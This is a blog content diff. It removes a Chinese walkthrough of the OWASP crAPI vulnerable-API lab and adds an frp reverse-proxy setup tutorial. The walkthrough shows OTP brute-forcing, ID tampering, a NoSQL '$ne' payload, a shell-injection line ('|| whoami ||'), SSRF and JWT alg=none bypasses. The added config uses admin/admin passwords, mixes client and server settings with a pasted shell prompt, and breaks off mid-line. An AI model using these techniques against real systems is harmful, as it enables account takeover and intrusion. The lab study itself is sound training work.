+    <content><![CDATA[<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>从 v0.52.0 版本开始，frp 开始支持 TOML、YAML 和 JSON 作为配置文件格式<br>请注意，INI 已被弃用，并将在未来的发布中移除。新功能只能在TOML、YAML 或 JSON 中使用。希望使用这些新功能的用户应相应地切换其配置格式</p>
+<h1 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h1><p>本教程基于frp_0.61.0_linux_amd64和frp_0.61.0_windows_amd64<br><a href="https://github.com/fatedier/frp/releases">Github-frp项目地址</a><br>FRP（Fast Reverse Proxy）是一种高性能的反向代理应用，主要用于内网穿透和将内网服务暴露到外网。它可以帮助用户通过公网上的一个服务器访问和管理位于内网的服务。FRP 由客户端和服务端两部分组成，通常用于突破防火墙或 NAT 网络限制，将内网中的应用通过外部可访问的 IP 暴露出来。<br><a href="https://github.com/VaalaCat/frp-panel">frp-panel项目地址</a><br>FRP-Pannel 是基于 FRP（Fast Reverse Proxy）的一种 Web 面板，用于管理和监控 FRP 代理服务。它提供了一个简单的图形界面，允许用户在浏览器中轻松配置和管理 FRP 服务，而无需直接编辑配置文件。FRP-Pannel 通常被用作 FRP 服务端的管理工具，尤其适合需要处理多个内网穿透代理的场景。<br><a href="https://gofrp.org/zh-cn/docs/features/common/configure/">frp使用教程</a><br><a href="https://www.yzjia.cn/17.html">frps&#x2F;c-panel配置教程</a></p>
+<h1 id="配置文件校验"><a href="#配置文件校验" class="headerlink" title="配置文件校验"></a>配置文件校验</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">frpc verify <span class="literal">-c</span> ./frpc.toml</span><br><span class="line">frps verify <span class="literal">-c</span> ./frps.toml</span><br></pre></td></tr></table></figure>
 
-<p>最新稳定版本:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose -f docker-compose.yml --compatibility up -d</span><br></pre></td></tr></table></figure>
-<p>最新开发版本:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line">VERSION=develop docker-compose pull</span><br><span class="line"></span><br><span class="line">VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d</span><br></pre></td></tr></table></figure>
-<h1 id="web站点结构梳理"><a href="#web站点结构梳理" class="headerlink" title="web站点结构梳理"></a>web站点结构梳理</h1><p>通过设置bp代理，手工浏览网页，target会自动记录站点信息<br><img src="/img/crapi/targetscan.png"></p>
-<h1 id="api结构"><a href="#api结构" class="headerlink" title="api结构"></a>api结构</h1><p>根据对web站点的结构梳理，存在以下api:</p>
-<h2 id="community交流板块"><a href="#community交流板块" class="headerlink" title="community交流板块"></a>community交流板块</h2><h3 id="community界面"><a href="#community界面" class="headerlink" title="community界面"></a>community界面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">community单个帖子</span><br><span class="line">/community/api/v2/community/posts/5y2b9gX7gFHhYeJxQ4STXN</span><br><span class="line"></span><br><span class="line">community板块下所有帖子</span><br><span class="line">/community/api/v2/community/posts/recent?limit=30&amp;offset=0</span><br></pre></td></tr></table></figure>
-<h3 id="coupon优惠券验证"><a href="#coupon优惠券验证" class="headerlink" title="coupon优惠券验证"></a>coupon优惠券验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优惠券验证(响应请求方法失败)</span><br><span class="line">/community/api/v2/coupon/validate-coupon</span><br></pre></td></tr></table></figure>
-<h2 id="identify身份认证功能"><a href="#identify身份认证功能" class="headerlink" title="identify身份认证功能"></a>identify身份认证功能</h2><h3 id="auth登录、注册、忘记密码"><a href="#auth登录、注册、忘记密码" class="headerlink" title="auth登录、注册、忘记密码"></a>auth登录、注册、忘记密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forget-password忘记密码功能</span><br><span class="line">/identity/api/auth/forget-password</span><br><span class="line"></span><br><span class="line">login登录功能</span><br><span class="line">/identity/api/auth/login</span><br><span class="line"></span><br><span class="line">signup注册功能</span><br><span class="line">/identity/api/auth/signup</span><br></pre></td></tr></table></figure>
-<h3 id="v3-otp验证"><a href="#v3-otp验证" class="headerlink" title="v3-otp验证"></a>v3-otp验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otp验证功能</span><br><span class="line">/identity/api/auth/v3/check-otp</span><br></pre></td></tr></table></figure>
-<h2 id="v2用户与车辆接口"><a href="#v2用户与车辆接口" class="headerlink" title="v2用户与车辆接口"></a>v2用户与车辆接口</h2><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人用户修改邮箱功能</span><br><span class="line">/identity/api/v2/user/change-email</span><br><span class="line"></span><br><span class="line">个人用户仪表板界面</span><br><span class="line">/identity/api/v2/user/dashboard</span><br><span class="line"></span><br><span class="line">个人头像上传功能</span><br><span class="line">/identity/api/v2/user/pictures</span><br><span class="line"></span><br><span class="line">个人用户密码重置功能</span><br><span class="line">/identity/api/v2/user/reset-password</span><br><span class="line"></span><br><span class="line">个人邮箱重置校验功能</span><br><span class="line">/identity/api/v2/user/verify-email-token</span><br><span class="line"></span><br><span class="line">个人视频上传功能</span><br><span class="line">/identity/api/v2/user/videos</span><br><span class="line"></span><br><span class="line">个人视频名称修改</span><br><span class="line">/identity/api/v2/user/videos/52</span><br><span class="line"></span><br><span class="line">个人视频更换</span><br><span class="line">/identity/api/v2/user/videos/convert_video</span><br></pre></td></tr></table></figure>
-<h3 id="vehicle"><a href="#vehicle" class="headerlink" title="vehicle"></a>vehicle</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人车辆添加功能</span><br><span class="line">/identity/api/v2/vehicle/add_vehicle</span><br><span class="line"></span><br><span class="line">车辆经纬度位置</span><br><span class="line">/identity/api/v2/vehicle/f597527e-a9d9-4c04-a6c6-5a6a82f1905e/location</span><br><span class="line"></span><br><span class="line">购买车辆验证码发送邮箱</span><br><span class="line">/identity/api/v2/vehicle/resend_email</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="workshop"><a href="#workshop" class="headerlink" title="workshop"></a>workshop</h2><h3 id="mechanic"><a href="#mechanic" class="headerlink" title="mechanic"></a>mechanic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/workshop/api/mechanic/mechanic_report?report_id=11</span><br></pre></td></tr></table></figure>
-<h3 id="merchant"><a href="#merchant" class="headerlink" title="merchant"></a>merchant</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/workshop/api/merchant/contact_mechanic</span><br></pre></td></tr></table></figure>
-<h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">订单购买</span><br><span class="line">/workshop/api/shop/orders</span><br><span class="line"></span><br><span class="line">总订单序号</span><br><span class="line">/workshop/api/shop/orders/16</span><br><span class="line"></span><br><span class="line">个人订单页</span><br><span class="line">/workshop/api/shop/orders/all?limit=30&amp;offset=0</span><br><span class="line"></span><br><span class="line">订单取消</span><br><span class="line">/workshop/api/shop/orders/return_order</span><br><span class="line"></span><br><span class="line">产品页</span><br><span class="line">/workshop/api/shop/products?limit=30&amp;offset=0</span><br></pre></td></tr></table></figure>
-
-<h1 id="失效的对象级别授权"><a href="#失效的对象级别授权" class="headerlink" title="失效的对象级别授权"></a>失效的对象级别授权</h1><p>Broken Object Level Authorization，它可以使API 端点不必要地公开很多数据属性，超过了该端点发挥其功能所需的数量，进而导致忽视最低权限原则<br>此漏洞会在无意中为攻击者提供过多的数据，然后攻击者会利用这些数据找到更多漏洞或 挖掘敏感数据</p>
-<h2 id="1-其他用户车辆信息"><a href="#1-其他用户车辆信息" class="headerlink" title="1.其他用户车辆信息"></a>1.其他用户车辆信息</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br>页面显示内容仅有头像、title、上传人名、内容、上传时间<br><img src="/img/crapi/bolaweb.png"><br>抓包显示包含额外的信息如email、vehicle id<br><img src="/img/crapi/bolabp.png"><br>存在接口识别vehicle id定位车辆经纬度的功能<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;vehicle&#x2F;your-vehicle_id&#x2F;location<br>页面功能点位置<br><img src="/img/crapi/locationweb.png"><br>通过修改vehicle id为其他用户的值，可查看其他用户的车辆详细信息<br><img src="/img/crapi/locationbp.png"></p>
-<h2 id="2-其他用户的问题报告"><a href="#2-其他用户的问题报告" class="headerlink" title="2.其他用户的问题报告"></a>2.其他用户的问题报告</h2><p>页面功能点位置，需填写联系的机械师，及报告内容<br><img src="/img/crapi/reportweb.png"><br>可发现vin、报告接收接口及发送次数，拦截该请求并抓返回包<br><img src="/img/crapi/reportbp.png"><br>可发现返回包发现新的接口及报告序号<br><img src="/img/crapi/reportback.png"><br>直接访问其他报告确实authentication，出现缺失JWT认证<br>:<a href="http://192.168.80.129:8888/workshop/api/mechanic/mechanic_report?report_id=1">http://192.168.80.129:8888/workshop/api/mechanic/mechanic_report?report_id=1</a><br><img src="/img/crapi/otherreporterror.png"></p>
-<p>抓包携带authentication，内部修改id值可显示其他用户报告内容，并泄露机械师email、number用户车辆vin值、number等敏感信息<br><img src="/img/crapi/otherreport.png"></p>
-<h1 id="失效的用户身份验证"><a href="#失效的用户身份验证" class="headerlink" title="失效的用户身份验证"></a>失效的用户身份验证</h1><p>Broken User Authentication<br>API在访问时未对请求方进行身份验证或身份验证存在问题导致易被破解<br>如:<br>未校验令牌的有效性<br>更新密码接口未限制请求频率，旧密码参数可暴力破解<br>短信验证码或者邮箱验证码有效期超出 10 分钟或者长度小于 6 位</p>
-<h2 id="3-重置其他用户的密码"><a href="#3-重置其他用户的密码" class="headerlink" title="3.重置其他用户的密码"></a>3.重置其他用户的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">旧的API版本通常会包含更多的安全漏洞，他们缺乏一些安全机制。我们可以使用REST API的一些特征来预测是否存在旧的API版本。</span><br><span class="line">比如当前有一个API被命名为/api/v3/login ，我们可以检查/api/v1/login是否存在 。</span><br></pre></td></tr></table></figure>
-<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#112;&#111;&#103;&#98;&#97;&#x30;&#48;&#54;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#x6d;">&#112;&#111;&#103;&#98;&#97;&#x30;&#48;&#54;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#x6d;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
-<p>发送多次后发现存在爆破次数上限<br><img src="/img/crapi/otpattackerrorbp.png"><br>查看接口发现存在v3，判断是否存在历史版本接口v1或v2(v1经验证不存在，v2未对爆破次数作限制)<br><img src="/img/crapi/otpattacksuccessbp.png"><br>经爆破otp验证码未6216，尝试修改密码后登录成功<br><img src="/img/crapi/loginsuccess.png"></p>
-<h1 id="过度数据暴露"><a href="#过度数据暴露" class="headerlink" title="过度数据暴露"></a>过度数据暴露</h1><p>Excessive Data Exposure<br>过度数据暴露是一种安全漏洞，当您的前端请求的数据超过预期时就会发生这种情况。在 Web 应用程序中，任何人都可以打开浏览器开发人员工具并检查传入和传出的 HTTP 请求。他们可以看到从这些请求中收到的数据负载。<br>因此，即使前端不一定使用或消费这些数据，攻击者仍然可以通过 API 调用查看这些数据。如果 API 发送的数据比前端需要的敏感数据多，攻击者就可以利用这些数据对用户造成损害。<br>这被称为过度数据暴露。在过度数据暴露中，暴露的敏感数据实际上比任何人可以访问的数据都要多。</p>
-<h2 id="4-其他用户敏感信息api接口"><a href="#4-其他用户敏感信息api接口" class="headerlink" title="4.其他用户敏感信息api接口"></a>4.其他用户敏感信息api接口</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br><img src="/img/crapi/bolabp.png"></p>
-<h2 id="5-视频内部属性api接口"><a href="#5-视频内部属性api接口" class="headerlink" title="5.视频内部属性api接口"></a>5.视频内部属性api接口</h2><p>已知关于视频的api接口<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;id值(抓包内的id)<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;convert_video<br>(其内包含 conversion_params”:”-v codec h264 似乎可以管道符命令注入，不过网上资料过少，待以后补充)<br><img src="/img/crapi/uploadvideobp.png"><br>md文档提示可利用泄露的视频api接口利用其他漏洞，尝试越权访问，修改第二个接口上传PUT改为GET并爆破id值失败，无法爆破其他人的视频数据，返回值与当前authentication绑定</p>
-<h1 id="资源缺乏和速率限制"><a href="#资源缺乏和速率限制" class="headerlink" title="资源缺乏和速率限制"></a>资源缺乏和速率限制</h1><p>Lack of Resources &amp; Rate Limiting<br>速率限制是计算机系统中使用的一种技术，用于控制允许请求或操作的速率。它通常用于防止滥用、保护资源和维护系统稳定性。<br>速率限制可以应用于各种环境中，例如API速率限制、登录尝试，甚至可以用于防御DDoS攻击。</p>
-<h2 id="6-使用-“contact-mechanic”-功能完成第7层DoS"><a href="#6-使用-“contact-mechanic”-功能完成第7层DoS" class="headerlink" title="6.使用 “contact mechanic” 功能完成第7层DoS"></a>6.使用 “contact mechanic” 功能完成第7层DoS</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">发现一个limit / page参数?(例如:/api/news?limit=100)它可能容易受到7层DoS的攻击。尝试发送一个长值(例如:limit=999999999)，看看会发生什么</span><br></pre></td></tr></table></figure>
-<p>在接口处 &#x2F;workshop&#x2F;api&#x2F;merchant&#x2F;contact_mechanic 发现 repeat_request_if_failed 和 number_of_repeats<br><img src="/img/crapi/repeatsbp.png"><br>repeat_request_if_failed值改为true，如果发送失败则再次发送，number_of_repeats值增加，再次发送<br>显示: 服务不可用。似乎是您造成了第7层DoS<br><img src="/img/crapi/ddos.png"></p>
-<p>除此之外在商品显示界面的limit值修改增加也出现了server error不知道算不算ddos<br><img src="/img/crapi/ddoserror.png"></p>
-<h1 id="失效的功能级别授权"><a href="#失效的功能级别授权" class="headerlink" title="失效的功能级别授权"></a>失效的功能级别授权</h1><p>Broken Function Level Authorization<br>功能级别授权中断(BFLA)是一种安全漏洞，当应用程序或系统没有在功能或功能级别正确实施访问控制时会发生。它允许用户执行他们不应该有权限使用的操作或访问功能。</p>
-<h2 id="7-删除其他用户视频"><a href="#7-删除其他用户视频" class="headerlink" title="7.删除其他用户视频"></a>7.删除其他用户视频</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">1.利用REST的可预测特性来查找管理API endpoints!比如你看到一个api叫做GET /api/v1/users/&lt;id&gt;，我们可以试着修改请求方法POST/DELETE来create/delete users.</span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
-<p>测试三个video接口，修改http请求为delete，发现接口&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;修改后提示非admin用户，猜测将user修改为admin<br><img src="/img/crapi/deletevideobp1.png"><br>删除成功(若页面显示仍存在视频，可以清空缓存或换浏览器访问)<br><img src="/img/crapi/deletevideobp2.png"><br>目前只删除了个人用户的视频，分析接口后跟随一个数值，猜测该值为所有视频的id值，将包放入intruder模块为id添加payload爆破，删除成功<br><img src="/img/crapi/deleteothervideobp.png"></p>
-<h1 id="批量分配-大量赋值"><a href="#批量分配-大量赋值" class="headerlink" title="批量分配&#x2F;大量赋值"></a>批量分配&#x2F;大量赋值</h1><p>Mass Assignment<br>大规模赋值是一种安全漏洞，当攻击者可以操纵输入数据来修改对象的属性时，就会出现这种漏洞，这通常会导致系统中发生未经授权的更改。<br>当开发人员没有正确地验证和清理用户输入或未能限制对象中哪些属性可以修改时，就会发生这种情况。</p>
-<h2 id="8-免费获得物品"><a href="#8-免费获得物品" class="headerlink" title="8.免费获得物品"></a>8.免费获得物品</h2><p>初始Available Balance为100.选择购买一件商品，值减少为90，若退货成功则值回到100<br>查看所有商品页面的接口，找到status状态存在两种状态，delivered、return pending。交付完毕和等待退货，猜测还有个退货成功的状态<br><img src="/img/crapi/orderstatus.png"><br>点击一个已购买的商品详情，修改请求为PUT，添加参数status值为return尝试将商品状态改为退货状态，显示status值只有’delivered’,’return pending’ or ‘returned’<br><img src="/img/crapi/orderreturnedbp1.png"><br>重新添加参数值为returned，退款成功<br>(货拿到了钱退回来了美滋滋~)<br><img src="/img/crapi/orderreturnedbp2.png"></p>
-<h2 id="9-余额增加"><a href="#9-余额增加" class="headerlink" title="9.余额增加"></a>9.余额增加</h2><p>余额增加的洞目前找到了两种，一种类似上述的免费获得物品，通过修改购买数量再修改status值获得退款余额，就不水了，另一种是通过修改购买接口的数量为负数:<br><img src="/img/crapi/moneyaddbp.png"></p>
-<h2 id="10-更新视频内部属性"><a href="#10-更新视频内部属性" class="headerlink" title="10.更新视频内部属性"></a>10.更新视频内部属性</h2><p>在之前视频属性内部api接口挑战中存在conversation_params参数，值为 -v codec h264，翻找资料似乎为FFmpeg的命令格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-v codec h264：这是用于指定视频编码的选项。</span><br><span class="line">-v 是视频编码的缩写（等价于 -c:v），用于表明后续设置应用于视频流。</span><br><span class="line">codec 表示要指定的编解码器。</span><br><span class="line">h264 是视频编码的格式，这种编码常用于网络流媒体和视频压缩，具有良好的压缩效率和兼容性。</span><br><span class="line">涉及的技术和知识</span><br><span class="line">视频编码和解码：H.264 是一种视频压缩标准，广泛应用于视频流媒体、视频存储和传输中。了解 H.264 编码格式、编码效率、视频质量和带宽需求等，是视频处理领域的基础知识。</span><br><span class="line">FFmpeg 命令行工具：FFmpeg 提供了丰富的命令选项，可用于各种视频和音频格式的转换与处理。了解 FFmpeg 命令的基础格式（如输入文件、输出文件、编码选项等）可以帮助进行视频处理的自动化。</span><br><span class="line">视频格式与容器：在视频编码的过程中，不仅涉及编码格式，还涉及容器（如 MP4、MKV 等）。不同的容器对视频流和音频流的兼容性也各不相同。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在linux内ffmpeg命令(转换视频编码为 H.264)格式</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ffmpeg -i 1.mp4 -vcodec h264 2.mp4</span><br><span class="line"></span><br><span class="line">尝试构造命令执行可成功</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ffmpeg -i 1.mp4 -vcodec h264 || whoami || 3.mp4</span><br><span class="line">...省略一堆内容...</span><br><span class="line">At least one output file must be specified</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-<p>暂时不做深度利用了，单纯修改视频内部属性:(最近爆了一个ffmpeg堆溢出洞有兴趣的可以取康康CVE-2024-7272)<br><img src="/img/crapi/changevideo.png"></p>
-<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="11-crapi发送http至baidu-com并成功返回http响应"><a href="#11-crapi发送http至baidu-com并成功返回http响应" class="headerlink" title="11.crapi发送http至baidu.com并成功返回http响应"></a>11.crapi发送http至baidu.com并成功返回http响应</h2><p>ssrf常出现在向其他服务器请求获取数据的位置，crapi靶场在发送问题报告的接口&#x2F;workshop&#x2F;api&#x2F;merchant&#x2F;contact_mechanic<br>mechanic_api参数存在向url地址请求数据，修改为给<a href="https://www.baidu.com/">https://www.baidu.com</a><br><img src="/img/crapi/ssrf.png"></p>
-<h1 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h1><h2 id="12-免费获得优惠券而不知道优惠券代码"><a href="#12-免费获得优惠券而不知道优惠券代码" class="headerlink" title="12.免费获得优惠券而不知道优惠券代码"></a>12.免费获得优惠券而不知道优惠券代码</h2><p>题目提示为nosql注入，优惠券相关接口:<br>&#x2F;community&#x2F;api&#x2F;v2&#x2F;coupon&#x2F;validate-coupon<br>猜测数据库构造的语句:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.coupon.find(&#123;&#x27;coupon_code&#x27;:&#x27;优惠券值&#x27;&#125;)</span><br></pre></td></tr></table></figure>
-<p>对该查询语句的绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;coupon_code&quot;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125; &#125;</span><br></pre></td></tr></table></figure>
-<p>写入后查询语句为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.coupon.find(&#123;&#x27;coupon_code&#x27;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125; &#125;)</span><br></pre></td></tr></table></figure>
-<p>相当于SQL注入的:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM coupon WHERE coupon_code &lt;&gt; &#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
-<p><img src="/img/crapi/nosqlinject.png"></p>
-<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="13-找到一种方法来兑换您已经通过修改数据库领取的优惠券"><a href="#13-找到一种方法来兑换您已经通过修改数据库领取的优惠券" class="headerlink" title="13.找到一种方法来兑换您已经通过修改数据库领取的优惠券"></a>13.找到一种方法来兑换您已经通过修改数据库领取的优惠券</h2><p><img src="/img/crapi/applycode.png"><br>题目提示sql注入，对coupon_code输入其他值显示不存在<br><img src="/img/crapi/sqlinjecterror.png"><br>sql注入成功(但显示这张券已被使用，似乎兑换券只有一张？？)<br><img src="/img/crapi/sqlinject.png"></p>
-<h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><h2 id="14-不为用户执行身份验证的api接口"><a href="#14-不为用户执行身份验证的api接口" class="headerlink" title="14.不为用户执行身份验证的api接口"></a>14.不为用户执行身份验证的api接口</h2><p>不需要cookies或authentication即可访问的页面<br><img src="/img/crapi/unauthentic.png"></p>
-<h1 id="JWT漏洞"><a href="#JWT漏洞" class="headerlink" title="JWT漏洞"></a>JWT漏洞</h1><h2 id="15-jwt令牌绕过"><a href="#15-jwt令牌绕过" class="headerlink" title="15.jwt令牌绕过"></a>15.jwt令牌绕过</h2><p>将jwt验证alg值改为none<br><img src="/img/crapi/jwt1.png"><br>将authentication的signature删除<br><img src="/img/crapi/jwt2.png"></p>
-<h1 id="注"><a href="#注" class="headerlink" title="注:"></a>注:</h1><p>使用clash&amp;switchomega+google+burpsuite时。<br>虚拟机linux使用docker部署crapi，本机google通过ip+端口访问crapi-web。<br>出现：<br>switch需使用全局proxy，即配置的clash端口7890代理<br>然后对特定的ip+端口设置为burp代理</p>
-<p>这才能实现crapi车辆定位功能<br>无论是bp使用上游代理还是switch只配置clash的proxy都无法实现车辆定位功能页面的访问</p>
-]]></content>
+<h1 id="frpc-toml"><a href="#frpc-toml" class="headerlink" title="frpc.toml"></a>frpc.toml</h1><p>命令运行</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">./frpc <span class="literal">-c</span> ./frpc.toml</span><br></pre></td></tr></table></figure>
+<p>frpc.toml配置文件</p>
+<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">6000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="frps-toml"><a href="#frps-toml" class="headerlink" title="frps.toml"></a>frps.toml</h1><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">6000</span></span><br><span class="line"><span class="section">[root@mail frp_0.61.0_linux_amd64]</span><span class="comment"># cat frps.toml </span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># 常规配置</span></span><br><span class="line"><span class="comment"># TCP 端口</span></span><br><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># frp 仪表板信息，最好不要动。</span></span><br><span class="line"><span class="comment"># 仪表板监听地址</span></span><br><span class="line"><span class="attr">dashboard_addr</span> = <span class="string">&quot;服务器IP&quot;</span></span><br><span class="line"><span class="comment"># 仪表板监听端口</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># 仪表板用户名</span></span><br><span class="line"><span class="attr">dashboard_user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment"># 仪表板密码</span></span><br><span class="line"><span class="attr">dashboard_pwd</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#加载frps-panel插件</span></span><br><span class="line"><span class="section">[[httpPlugins]]</span></span><br><span class="line"><span class="comment"># HTTP 插件配置</span></span><br><span class="line"><span class="comment"># 插件名称</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;frps-panel&quot;</span></span><br><span class="line"><span class="comment"># 插件地址</span></span><br><span class="line"><span class="attr">addr</span> = <span class="string">&quot;服务器IP:7200&quot;</span></span><br><span class="line"><span class="comment"># 插件路径</span></span><br><span class="line"><span class="attr">path</span> = <span class="string">&quot;/handler&quot;</span></span><br><span class="line"><span class="comment"># 操作列表</span></span><br><span class="line"><span class="attr">ops</span> = [<span class="string">&quot;Login&quot;</span>, <span class="string">&quot;NewWorkConn&quot;</span>, <span class="string">&quot;NewUserConn&quot;</span>, <span class="string">&quot;NewProxy&quot;</span>, <span class="string">&quot;Ping&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="frp-panel-toml"><a href="#frp-panel-toml" class="headerlink" title="frp-panel.toml"></a>frp-panel.toml</h1><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># 常规配置</span></span><br><span class="line"><span class="comment"># 插件监听地址，改为127.0.0.1后外网无法访问面板。</span></span><br><span class="line"><span class="attr">plugin_addr</span> = <span class="string">&quot;服务器IP&quot;</span></span><br><span class="line"><span class="comment"># 插件监听端口</span></span><br><span class="line"><span class="attr">plugin_port</span> = <span class="number">7200</span></span><br><span class="line"><span class="comment"># 面板管理员用户名，可以更改。</span></span><br><span class="line"><span class="attr">admin_user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment"># 面板管理员密码，可以更改</span></span><br><span class="line"><span class="attr">admin_pwd</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment"># 指定登录状态保持时间</span></span><br><span class="line"><span class="attr">admin_keep_time</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用 https</span></span><br><span class="line"><span class="attr">tls_mode</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment"># TLS 证书文件路径</span></span><br><span class="line"><span class="comment"># tls_cert_file = &quot;cert.crt&quot;</span></span><br><span class="line"><span class="comment"># TLS 密钥文件路径</span></span><br><span class="line"><span class="comment"># tls_key_file = &quot;cert.key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># frp 仪表板信息，对应frps.toml里面的一模一样，不然连接不上。</span></span><br><span class="line"><span class="comment"># 仪表板监听地址</span></span><br><span class="line"><span class="attr">dashboard_addr</span> = <span class="string">&quot;服务器IP&quot;</span></span><br><span class="line"><span class="comment"># 仪表板监听端口</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># 仪表板用户名</span></span><br><span class="line"><span class="attr">dashboard_user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment"># 仪表板密码</span></span><br><span class="line"><span 